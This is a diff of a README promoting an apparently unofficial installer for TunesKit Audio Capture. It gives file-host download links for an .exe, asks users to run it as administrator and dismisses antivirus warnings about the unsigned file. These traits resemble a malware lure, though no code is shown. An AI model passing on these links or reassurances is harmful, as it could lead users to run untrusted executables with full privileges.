@@ -1,48 +1,62 @@
-# <div align="center">🎧 TunesKit Audio Capture Installer</div>
-
 <div align="center">
 
-<img src="https://img.shields.io/badge/Windows-10%20%2F%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white">
+# 🎧 TunesKit Audio Capture Installer
 
-<img src="https://img.shields.io/badge/Installer-Premium-success?style=for-the-badge&logo=windows-terminal&logoColor=white">
+<img src="https://img.shields.io/badge/WINDOWS-10%20%2F%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white">
 
-<img src="https://img.shields.io/badge/Admin-Required-red?style=for-the-badge&logo=shield&logoColor=white">
+<img src="https://img.shields.io/badge/INSTALLER-PROFESSIONAL-success?style=for-the-badge&logo=windows-terminal&logoColor=white">
 
-<img src="https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge">
+<img src="https://img.shields.io/badge/STATUS-STABLE-brightgreen?style=for-the-badge">
+
+<img src="https://img.shields.io/badge/ADMIN-REQUIRED-red?style=for-the-badge&logo=shield&logoColor=white">
+
+<br><br>
+
+⚡ Professional Automated Windows Installer  
+📦 Clean Deployment Package  
+🚀 Optimized Installation Experience  
 
 </div>
 
 ---
 
-# 🌟 Professional Windows Installer
+# 🌟 About
 
 <div align="center">
 
-⚡ Fast Deployment  
-📦 Automatic Installation  
-🖥️ Desktop Shortcuts  
-🔒 Administrator Support  
-🚀 Optimized Setup Experience  
+Professional installer for deploying  
+**TunesKit Audio Capture** automatically on Windows systems.
+
+🖥️ Desktop Shortcut Creation  
+📁 Automatic File Extraction  
+🔒 Administrator Installation  
+⚡ Fast & Optimized Setup  
 
 </div>
 
 ---
 
-# 📥 Download Links
+# 📥 Download Center
 
 <div align="center">
 
-## ☁️ pCloud (Recommended)
+# ☁️ pCloud Download
 
 <a href="https://u.pcloud.link/publink/show?code=VZ6jsU5ZMblFc8xwWHbexeG9QR7Q4j8rtTqy">
 
-<img src="https://img.shields.io/badge/⬇ DOWNLOAD FROM PCLOUD-1E90FF?style=for-the-badge&logo=icloud&logoColor=white">
+<img src="https://img.shields.io/badge/⬇ DOWNLOAD NOW-1E90FF?style=for-the-badge&logo=icloud&logoColor=white">
 
 </a>
 
 <br><br>
 
-## 🔥 Google Drive
+```txt
+https://u.pcloud.link/publink/show?code=VZ6jsU5ZMblFc8xwWHbexeG9QR7Q4j8rtTqy
+```
+
+---
+
+# 🔥 Google Drive
 
 <a href="https://drive.google.com/file/d/1b_FrFjolQmPVCjAsJ5owV4GucB9c1DsV/view?usp=drive_link">
 
@@ -52,13 +66,25 @@
 
 <br><br>
 
-## ⚡ MediaFire
+```txt
+https://drive.google.com/file/d/1b_FrFjolQmPVCjAsJ5owV4GucB9c1DsV/view?usp=drive_link
+```
+
+---
+
+# ⚡ MediaFire
 
 <a href="https://www.mediafire.com/file/645b53g1mvhao4y/TunesKitInstaller.exe/file">
 
 <img src="https://img.shields.io/badge/MEDIAFIRE-0099FF?style=for-the-badge&logo=mediafire&logoColor=white">
 
 </a>
+
+<br><br>
+
+```txt
+https://www.mediafire.com/file/645b53g1mvhao4y/TunesKitInstaller.exe/file
+```
 
 </div>
 
@@ -70,13 +96,13 @@
 
 ## 1️⃣ Download Installer
 
-⬇️ Download the `.exe` file
+⬇️ Download the setup `.exe`
 
 ---
 
 ## 2️⃣ Run as Administrator
 
-🖱️ Right-click installer
+🖱️ Right Click → Run as administrator
 
 ```txt
 Run as administrator
@@ -84,15 +110,15 @@ Run as administrator
 
 ---
 
-## 3️⃣ Follow Setup Wizard
+## 3️⃣ Complete Setup
 
-📦 Wait for extraction and installation
+📦 Wait until extraction and installation finish
 
 ---
 
 ## 4️⃣ Launch Application
 
-🖥️ Open using desktop shortcut or Start Menu
+🖥️ Open from Desktop Shortcut or Start Menu
 
 </div>
 
@@ -100,11 +126,15 @@ Run as administrator
 
 # 📂 Installation Paths
 
-## 📁 Main Directory
+<div align="center">
+
+## 📁 Program Files
 
 ```txt
 C:\Program Files (x86)\TunesKit Audio Capture\
 ```
+
+---
 
 ## 📁 ProgramData
 
@@ -112,11 +142,15 @@ C:\Program Files (x86)\TunesKit Audio Capture\
 C:\ProgramData\TunesKit Audio Capture\
 ```
 
+---
+
 ## 🖥️ Desktop Shortcut
 
 ```txt
 TunesKit Audio Capture.lnk
 ```
+
+</div>
 
 ---
 
@@ -124,30 +158,30 @@ TunesKit Audio Capture.lnk
 
 <div align="center">
 
-| Feature | Description |
+| 🚀 Feature | 📦 Description |
 |---|---|
-| ⚡ Fast Setup | Quick installation process |
-| 📁 Auto Extraction | Files deploy automatically |
-| 🖥️ Desktop Shortcut | Instant access |
-| 🔒 Admin Support | Proper Windows permissions |
-| 📦 Clean Installer | Professional packaging |
-| 🚀 Optimized | Lightweight & stable |
-| 💻 Windows Ready | Compatible with Windows 10/11 |
+| ⚡ Fast Setup | Quick installation |
+| 📁 Auto Extraction | Files install automatically |
+| 🖥️ Desktop Shortcut | Instant desktop access |
+| 🔒 Admin Support | Full permissions support |
+| 📦 Clean Package | Professional deployment |
+| 💻 Windows Ready | Optimized for Windows 10/11 |
+| 🚀 Stable Build | Lightweight & fast |
 
 </div>
 
 ---
 
-# 🧠 System Requirements
+# 🧠 Requirements
 
 <div align="center">
 
-| Component | Requirement |
+| 💻 Component | ✅ Requirement |
 |---|---|
-| 🖥️ OS | Windows 10 / 11 |
-| ⚙️ Architecture | 64-bit Recommended |
-| 🔒 Permissions | Administrator |
-| 💾 Free Space | 200 MB |
+| Operating System | Windows 10 / 11 |
+| Architecture | 64-bit Recommended |
+| Permissions | Administrator |
+| Storage | 200 MB Free Space |
 
 </div>
 
@@ -158,9 +192,9 @@ TunesKit Audio Capture.lnk
 <div align="center">
 
 ⚠️ Antivirus may scan unsigned installers  
-⚠️ Do not rename setup executable  
-⚠️ Run installer with admin permissions  
-⚠️ Keep setup files in same directory  
+⚠️ Keep installer filename unchanged  
+⚠️ Run installer with administrator permissions  
+⚠️ Keep setup files in the same folder  
 
 </div>
 
@@ -178,7 +212,7 @@ TunesKit Audio Capture.lnk
 
 <br><br>
 
-## 📩 Gmail
+# 📩 Gmail
 
 ```txt
 andyaxceldcc@gmail.com
@@ -188,7 +222,7 @@ andyaxceldcc@gmail.com
 
 ---
 
-# 📱 Follow Me on TikTok
+# 📱 Official TikTok
 
 <div align="center">
 
@@ -200,28 +234,20 @@ andyaxceldcc@gmail.com
 
 <br><br>
 
-🔥 Follow my official TikTok account for:
+🔥 Follow for:
 
-🎵 Music Content  
-💻 Tech Projects  
-🚀 Installer Updates  
-📦 Software Releases  
-🎬 Videos & Tutorials  
+🎬 Videos  
+💻 Tech Content  
+📦 Installer Updates  
+🚀 Software Releases  
+🎵 Music & More  
 
 <br>
 
-<a href="https://www.tiktok.com/@usernamelol919">
-
-<img src="https://img.shields.io/badge/CLICK TO FOLLOW-FF0050?style=for-the-badge&logo=tiktok&logoColor=white">
-
-</a>
-
-<br><br>
-
-## 👤 TikTok Username
+# 🔗 TikTok Link
 
 ```txt
-@usernamelol919
+https://www.tiktok.com/@usernamelol919
 ```
 
 </div>
@@ -232,12 +258,15 @@ andyaxceldcc@gmail.com
 
 <div align="center">
 
-🎧 Professional installer for  
-TunesKit Audio Capture
+# 🎧 TunesKit Audio Capture
 
-⚡ Automated  
-📦 Clean  
+⚡ Professional  
+📦 Automated  
 🔒 Secure  
-💻 Windows Optimized
+💻 Windows Optimized  
+
+<br>
+
+Made with ❤️ for Windows Users
 
 </div>
